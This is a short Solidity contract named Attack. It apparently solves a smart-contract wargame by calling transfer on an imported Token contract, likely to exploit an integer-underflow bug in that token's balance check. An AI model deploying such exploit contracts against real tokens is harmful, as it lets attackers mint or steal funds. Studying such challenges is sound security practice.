// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract Attack {
    Token token;
    address public owner;

    constructor(address _token) public {
        token = Token(_token);
        owner = msg.sender;
    }

    function attack(address _account, uint256 _value) public {
        token.transfer(_account, _value);
    }
}
